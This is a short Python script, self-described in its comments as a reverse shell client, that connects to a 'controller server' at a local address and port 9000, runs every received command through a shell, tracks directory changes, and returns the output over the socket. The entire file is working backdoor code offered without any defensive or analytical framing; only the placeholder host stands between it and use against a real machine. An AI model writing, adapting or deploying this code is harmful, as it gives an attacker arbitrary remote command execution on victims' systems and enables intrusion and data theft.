import socket
import subprocess
import os

# Initialize socket for reverse shell connection
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the controller server
client_socket.connect(('127.0.0.1', 9000))

# Store the current working directory to maintain state between commands
current_directory = os.getcwd()

try:
    while True:
        # Receive command from the controller with a larger buffer to handle big outputs
        cmd = client_socket.recv(4096).decode('utf-8').strip()
        
        if not cmd:
            continue
        
        try:
            # Execute the command in the current working directory context
            # This allows commands like 'cd' to persist and 'ls' to work on the current dir
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                cwd=current_directory,
                text=False  # Keep output as bytes for reliable transmission
            )
            
            # Combine stdout and stderr to send all output back to controller
            output = result.stdout + result.stderr
            
            # If the command was a cd command, update the current directory
            if cmd.strip().startswith('cd '):
                try:
                    # Extract the target directory and change to it
                    target_dir = cmd.strip()[3:].strip()
                    os.chdir(target_dir)
                    current_directory = os.getcwd()
                    output = f"Changed directory to: {current_directory}\n".encode()
                except Exception as e:
                    output = f"Error changing directory: {str(e)}\n".encode()
            
            # Send the result back to the controller
            # Add a delimiter to signal end of response for multi-packet handling
            client_socket.sendall(output + b'\n[END_OF_RESPONSE]\n')
            
        except Exception as e:
            # Send error message back to controller
            error_msg = f"Error executing command: {str(e)}\n[END_OF_RESPONSE]\n".encode()
            client_socket.sendall(error_msg)

except KeyboardInterrupt:
    print("Connection terminated by user")
finally:
    # Properly close the connection
    client_socket.close()